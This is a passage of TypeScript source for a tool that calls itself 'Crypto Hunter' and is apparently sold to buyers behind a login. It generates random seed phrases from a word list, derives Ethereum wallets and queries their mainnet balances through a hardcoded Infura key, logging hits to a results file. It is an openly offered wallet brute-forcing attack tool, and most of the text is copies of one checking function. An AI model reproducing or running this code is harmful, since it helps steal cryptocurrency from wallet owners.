    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s181(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s182(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s183(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s184(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s185(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s186(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s187(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s188(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s189(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s190(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s191(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s192(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s193(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s194(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s195(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s196(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s197(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s198(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s199(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s200(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s201(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s202(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s203(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s204(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s205(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s206(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s207(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s208(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s209(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s210(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s211(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s212(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s213(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s214(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s215(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s216(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s217(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s218(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s219(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}

function getRandomMnemonic(wordsArray: string[], wordCount = 12): string {
  if (wordsArray.length < wordCount) {
    throw new Error(
      "The word array does not contain enough elements to generate the desired number of words."
    );
  }

  let indices = new Set<number>(); // Explicitly typing the Set as a collection of numbers
  while (indices.size < wordCount) {
    const randomIndex = crypto.randomInt(0, wordsArray.length);
    indices.add(randomIndex);
  }

  // Convert set to array and assert that all elements are numbers, to satisfy TypeScript's type checking
  const arrayOfIndices: number[] = Array.from(indices);
  return arrayOfIndices.map((index) => wordsArray[index]).join(" ");
}

let timeout = 10000; // 10 seconds
const db: any = await connectDB();

const data:any = await fs.readFileSync('seeds.txt', 'utf-8');
const wordsArray = data.split(/\r?\n/);
async function login() {
rl.question('Do you have CryptoHunter Login Details? (yes/no): ', answer => {
    // Normalize the input to lowercase to simplify comparison
    const normalizedAnswer = answer.trim().toLowerCase();
    if (normalizedAnswer === 'yes') {
      rl.question('Please enter your username: ', username => {
        rl.stdoutMute = true; // Assuming you have setup stdoutMute logic as in the previous example
        rl.question('Please enter your password: ', password => {
            rl.stdoutMute = false;
            if (checkCredentials(username, password)) {
                console.clear();
                console.log("Crypto Hunter is Running, Please Open result.txt file to check your hits");
                runCh();
            } else {
              console.log('Please contact your seller to get login details.');
              process.exit(0);
            }
            rl.close();
        });
      });
    } else if (normalizedAnswer === 'no') {
        console.log('Please contact your seller to get login details.');
        process.exit(0);
        rl.close(); // Close the readline interface and exit
    } else {
        console.log('Invalid response. Please type "yes" or "no".');
        login();
    }
});
}
login();
async function runCh(){
for (let index = 0; index < 100000; index++) {
  try {
    setTimeout(() => {
      s1(getRandomMnemonic(wordsArray),db);
      s2(getRandomMnemonic(wordsArray),db);
      s3(getRandomMnemonic(wordsArray),db);
      s4(getRandomMnemonic(wordsArray),db);
      s5(getRandomMnemonic(wordsArray),db);
      s6(getRandomMnemonic(wordsArray),db);
      s7(getRandomMnemonic(wordsArray),db);
      s8(getRandomMnemonic(wordsArray),db);
      s9(getRandomMnemonic(wordsArray),db);
      s10(getRandomMnemonic(wordsArray),db);
      s11(getRandomMnemonic(wordsArray),db);
      s12(getRandomMnemonic(wordsArray),db);
      s13(getRandomMnemonic(wordsArray),db);
      s14(getRandomMnemonic(wordsArray),db);
      s15(getRandomMnemonic(wordsArray),db);
      s16(getRandomMnemonic(wordsArray),db);
      s17(getRandomMnemonic(wordsArray),db);
      s18(getRandomMnemonic(wordsArray),db);
      s19(getRandomMnemonic(wordsArray),db);
      s20(getRandomMnemonic(wordsArray),db);
      s21(getRandomMnemonic(wordsArray),db);
      s22(getRandomMnemonic(wordsArray),db);
      s23(getRandomMnemonic(wordsArray),db);
      s24(getRandomMnemonic(wordsArray),db);
      s25(getRandomMnemonic(wordsArray),db);
      s26(getRandomMnemonic(wordsArray),db);
      s27(getRandomMnemonic(wordsArray),db);
      s28(getRandomMnemonic(wordsArray),db);
      s29(getRandomMnemonic(wordsArray),db);
      s30(getRandomMnemonic(wordsArray),db);
      s31(getRandomMnemonic(wordsArray),db);
      s32(getRandomMnemonic(wordsArray),db);
      s33(getRandomMnemonic(wordsArray),db);
      s34(getRandomMnemonic(wordsArray),db);
      s35(getRandomMnemonic(wordsArray),db);
      s36(getRandomMnemonic(wordsArray),db);
      s37(getRandomMnemonic(wordsArray),db);
      s38(getRandomMnemonic(wordsArray),db);
      s39(getRandomMnemonic(wordsArray),db);
      s40(getRandomMnemonic(wordsArray),db);
      s41(getRandomMnemonic(wordsArray),db);
      s42(getRandomMnemonic(wordsArray),db);
      s43(getRandomMnemonic(wordsArray),db);
      s44(getRandomMnemonic(wordsArray),db);
      s45(getRandomMnemonic(wordsArray),db);
      s46(getRandomMnemonic(wordsArray),db);
      s47(getRandomMnemonic(wordsArray),db);
      s48(getRandomMnemonic(wordsArray),db);
      s49(getRandomMnemonic(wordsArray),db);
      s50(getRandomMnemonic(wordsArray),db);
      s51(getRandomMnemonic(wordsArray),db);
      s52(getRandomMnemonic(wordsArray),db);
      s53(getRandomMnemonic(wordsArray),db);
      s54(getRandomMnemonic(wordsArray),db);
      s55(getRandomMnemonic(wordsArray),db);
      s56(getRandomMnemonic(wordsArray),db);
      s57(getRandomMnemonic(wordsArray),db);
      s58(getRandomMnemonic(wordsArray),db);
      s59(getRandomMnemonic(wordsArray),db);
      s60(getRandomMnemonic(wordsArray),db);
      s61(getRandomMnemonic(wordsArray),db);
      s62(getRandomMnemonic(wordsArray),db);
      s63(getRandomMnemonic(wordsArray),db);
      s64(getRandomMnemonic(wordsArray),db);
      s65(getRandomMnemonic(wordsArray),db);
      s66(getRandomMnemonic(wordsArray),db);
      s67(getRandomMnemonic(wordsArray),db);
      s68(getRandomMnemonic(wordsArray),db);
      s69(getRandomMnemonic(wordsArray),db);
      s70(getRandomMnemonic(wordsArray),db);
      s71(getRandomMnemonic(wordsArray),db);
      s72(getRandomMnemonic(wordsArray),db);
      s73(getRandomMnemonic(wordsArray),db);
      s74(getRandomMnemonic(wordsArray),db);
      s75(getRandomMnemonic(wordsArray),db);
      s76(getRandomMnemonic(wordsArray),db);
      s77(getRandomMnemonic(wordsArray),db);
      s78(getRandomMnemonic(wordsArray),db);
      s79(getRandomMnemonic(wordsArray),db);
      s80(getRandomMnemonic(wordsArray),db);
      s81(getRandomMnemonic(wordsArray),db);
      s82(getRandomMnemonic(wordsArray),db);
      s83(getRandomMnemonic(wordsArray),db);
      s84(getRandomMnemonic(wordsArray),db);
      s85(getRandomMnemonic(wordsArray),db);
      s86(getRandomMnemonic(wordsArray),db);
      s87(getRandomMnemonic(wordsArray),db);
      s88(getRandomMnemonic(wordsArray),db);
      s89(getRandomMnemonic(wordsArray),db);
      s90(getRandomMnemonic(wordsArray),db);
      s91(getRandomMnemonic(wordsArray),db);
      s92(getRandomMnemonic(wordsArray),db);
      s93(getRandomMnemonic(wordsArray),db);
      s94(getRandomMnemonic(wordsArray),db);
      s95(getRandomMnemonic(wordsArray),db);
      s96(getRandomMnemonic(wordsArray),db);
      s97(getRandomMnemonic(wordsArray),db);
      s98(getRandomMnemonic(wordsArray),db);
      s99(getRandomMnemonic(wordsArray),db);
      s100(getRandomMnemonic(wordsArray),db);
      s101(getRandomMnemonic(wordsArray),db);
      s102(getRandomMnemonic(wordsArray),db);
      s103(getRandomMnemonic(wordsArray),db);
      s104(getRandomMnemonic(wordsArray),db);
      s105(getRandomMnemonic(wordsArray),db);
      s106(getRandomMnemonic(wordsArray), db);
      s107(getRandomMnemonic(wordsArray), db);
      s108(getRandomMnemonic(wordsArray), db);
      s109(getRandomMnemonic(wordsArray), db);
      s110(getRandomMnemonic(wordsArray), db);
      s111(getRandomMnemonic(wordsArray), db);
      s112(getRandomMnemonic(wordsArray), db);
      s113(getRandomMnemonic(wordsArray), db);
      s114(getRandomMnemonic(wordsArray), db);
      s115(getRandomMnemonic(wordsArray), db);
      s116(getRandomMnemonic(wordsArray), db);
      s117(getRandomMnemonic(wordsArray), db);
      s118(getRandomMnemonic(wordsArray), db);
      s119(getRandomMnemonic(wordsArray), db);
      s120(getRandomMnemonic(wordsArray), db);
      s121(getRandomMnemonic(wordsArray), db);
      s122(getRandomMnemonic(wordsArray), db);
      s123(getRandomMnemonic(wordsArray), db);
      s124(getRandomMnemonic(wordsArray), db);
      s125(getRandomMnemonic(wordsArray), db);
      s126(getRandomMnemonic(wordsArray), db);
      s127(getRandomMnemonic(wordsArray), db);
      s128(getRandomMnemonic(wordsArray), db);
      s129(getRandomMnemonic(wordsArray), db);
      s130(getRandomMnemonic(wordsArray), db);
      s131(getRandomMnemonic(wordsArray), db);
      s132(getRandomMnemonic(wordsArray), db);
      s133(getRandomMnemonic(wordsArray), db);
      s134(getRandomMnemonic(wordsArray), db);
      s135(getRandomMnemonic(wordsArray), db);
      s136(getRandomMnemonic(wordsArray), db);
      s137(getRandomMnemonic(wordsArray), db);
      s138(getRandomMnemonic(wordsArray), db);
      s139(getRandomMnemonic(wordsArray), db);
      s140(getRandomMnemonic(wordsArray), db);
      s141(getRandomMnemonic(wordsArray), db);
      s142(getRandomMnemonic(wordsArray), db);
      s143(getRandomMnemonic(wordsArray), db);
      s144(getRandomMnemonic(wordsArray), db);
      s145(getRandomMnemonic(wordsArray), db);
      s146(getRandomMnemonic(wordsArray), db);
      s147(getRandomMnemonic(wordsArray), db);
      s148(getRandomMnemonic(wordsArray), db);
      s149(getRandomMnemonic(wordsArray), db);
      s150(getRandomMnemonic(wordsArray), db);
      s151(getRandomMnemonic(wordsArray), db);
      s152(getRandomMnemonic(wordsArray), db);
      s153(getRandomMnemonic(wordsArray), db);
      s154(getRandomMnemonic(wordsArray), db);
      s155(getRandomMnemonic(wordsArray), db);
      s156(getRandomMnemonic(wordsArray), db);
      s157(getRandomMnemonic(wordsArray), db);
      s158(getRandomMnemonic(wordsArray), db);
      s159(getRandomMnemonic(wordsArray), db);
      s160(getRandomMnemonic(wordsArray), db);
      s161(getRandomMnemonic(wordsArray), db);
      s162(getRandomMnemonic(wordsArray), db);
      s163(getRandomMnemonic(wordsArray), db);
      s164(getRandomMnemonic(wordsArray), db);
      s165(getRandomMnemonic(wordsArray), db);
      s166(getRandomMnemonic(wordsArray), db);
      s167(getRandomMnemonic(wordsArray), db);
      s168(getRandomMnemonic(wordsArray), db);
      s169(getRandomMnemonic(wordsArray), db);
      s170(getRandomMnemonic(wordsArray), db);
      s171(getRandomMnemonic(wordsArray), db);
      s172(getRandomMnemonic(wordsArray), db);
      s173(getRandomMnemonic(wordsArray), db);
      s174(getRandomMnemonic(wordsArray), db);
      s175(getRandomMnemonic(wordsArray), db);
      s176(getRandomMnemonic(wordsArray), db);
      s177(getRandomMnemonic(wordsArray), db);
      s178(getRandomMnemonic(wordsArray), db);
      s179(getRandomMnemonic(wordsArray), db);
      s180(getRandomMnemonic(wordsArray), db);
      s181(getRandomMnemonic(wordsArray), db);
      s182(getRandomMnemonic(wordsArray), db);
      s183(getRandomMnemonic(wordsArray), db);
      s184(getRandomMnemonic(wordsArray), db);
      s185(getRandomMnemonic(wordsArray), db);
      s186(getRandomMnemonic(wordsArray), db);
      s187(getRandomMnemonic(wordsArray), db);
      s188(getRandomMnemonic(wordsArray), db);
      s189(getRandomMnemonic(wordsArray), db);
      s190(getRandomMnemonic(wordsArray), db);
      s191(getRandomMnemonic(wordsArray), db);
      s192(getRandomMnemonic(wordsArray), db);
      s193(getRandomMnemonic(wordsArray), db);
      s194(getRandomMnemonic(wordsArray), db);
      s195(getRandomMnemonic(wordsArray), db);
      s196(getRandomMnemonic(wordsArray), db);
      s197(getRandomMnemonic(wordsArray), db);
      s198(getRandomMnemonic(wordsArray), db);
      s199(getRandomMnemonic(wordsArray), db);
      s200(getRandomMnemonic(wordsArray), db);
      s201(getRandomMnemonic(wordsArray), db);
